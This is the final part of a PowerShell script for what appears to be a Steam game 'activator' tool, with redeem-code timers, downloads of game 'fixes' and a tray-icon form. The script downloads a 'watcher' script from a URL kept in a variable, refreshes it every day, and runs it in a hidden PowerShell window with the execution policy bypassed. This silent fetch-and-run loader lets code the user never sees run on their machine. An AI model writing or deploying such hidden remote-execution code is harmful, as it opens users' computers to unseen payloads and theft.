                    try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($o); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                    Remove-Item $o -Force -ErrorAction SilentlyContinue
                    return $er } catch { return @() }
                } -ArgumentList $fu, $zip, $curFolders[$name]
                $script:fixJobs[$name] = @{job=$job; path=$curFolders[$name]}
            }
        }
    } catch {}
})
$script:steamWatchTimer.Start()

# Sync activeCodes from real timer file on startup
function Sync-ActiveCodesFromTimers {
    # Only add codes from file that aren't in memory yet (never remove from memory here)
    if (-not (Test-Path $TIMERS_FILE)) { return }
    $realTimers = Get-ActiveTimers
    $memGameNames = @($script:activeCodes | ForEach-Object { $_.Game })
    foreach ($t in $realTimers) {
        $exp = $t.expires_at -as [datetime]
        if (-not $exp) { continue }
        if ($memGameNames -contains $t.game_name) { continue }
        $c = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }
        $d = if ($t.PSObject.Properties.Name -contains 'duration') { $t.duration } else { $null }
        $script:activeCodes.Add(@{Code=$c;Game=$t.game_name;ActivatedAt=(Get-Date);ExpiresAt=$exp;Duration=$d})|Out-Null
    }
}
Sync-ActiveCodesFromTimers

$script:watcherEnabled = $true

# Ã¢â€â‚¬Ã¢â€â‚¬ Launch download_watcher.ps1 hidden in background Ã¢â€â‚¬Ã¢â€â‚¬
$script:watcherProcess = $null
$script:watcherLogPath = Join-Path $env:TEMP "bsmap_watcher.log"
try {
    $watcherTemp = Join-Path $env:TEMP "bsmap_watcher.ps1"
    try { Add-Content -Path $script:watcherLogPath -Value "`n=== [$(Get-Date -Format 'HH:mm:ss')] ACTIVATOR INICIADO ===" -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
    if (-not (Test-Path $watcherTemp) -or ((Get-Date) - (Get-Item $watcherTemp -ErrorAction SilentlyContinue).LastWriteTime).TotalHours -gt 24) {
        Add-Content -Path $script:watcherLogPath -Value "[START] Descargando watcher..." -Encoding UTF8 -ErrorAction SilentlyContinue
        Invoke-RestMethod -Uri $script:watcherUrl -UseBasicParsing -TimeoutSec 15 -OutFile $watcherTemp -ErrorAction SilentlyContinue
        if (Test-Path $watcherTemp) { Add-Content -Path $script:watcherLogPath -Value "[START] Watcher descargado: $((Get-Item $watcherTemp).Length) bytes" -Encoding UTF8 -ErrorAction SilentlyContinue }
        else { Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: descarga fallo" -Encoding UTF8 -ErrorAction SilentlyContinue }
    } else { Add-Content -Path $script:watcherLogPath -Value "[START] Watcher en cache, no necesita descargar" -Encoding UTF8 -ErrorAction SilentlyContinue }
    if (Test-Path $watcherTemp) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherTemp`""
        $psi.WindowStyle = "Hidden"
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        $script:watcherProcess = [System.Diagnostics.Process]::Start($psi)
        Add-Content -Path $script:watcherLogPath -Value "[START] Watcher lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
    } else { Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: archivo watcher no encontrado" -Encoding UTF8 -ErrorAction SilentlyContinue }
} catch { Write-ErrorLog "Launch watcher" $_; Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: $($_.Exception.Message)" -Encoding UTF8 -ErrorAction SilentlyContinue }

[System.Windows.Forms.Application]::Run($form)
$script:trayIcon.Dispose()
if ($script:countdownTick) { $script:countdownTick.Stop(); $script:countdownTick.Dispose() }
if ($script:refreshTimers) { $script:refreshTimers.Stop(); $script:refreshTimers.Dispose() }
if ($script:urlChecker) { $script:urlChecker.Stop(); $script:urlChecker.Dispose() }
if ($script:steamWatchTimer) { $script:steamWatchTimer.Stop(); $script:steamWatchTimer.Dispose() }
if ($script:watcherLogTimer) { $script:watcherLogTimer.Stop(); $script:watcherLogTimer.Dispose() }
if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill() } catch {} }
if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { Remove-Job $j.job -Force -ErrorAction SilentlyContinue } catch {} } }
if ($script:fixesJob) { try { Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } catch {} }
if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
if ($script:logoBmp) { $script:logoBmp.Dispose() };if ($script:tiktokBmp) { $script:tiktokBmp.Dispose() };if ($script:discordBmp) { $script:discordBmp.Dispose() };if ($ib) { $ib.Dispose() }


# b64 placeholder








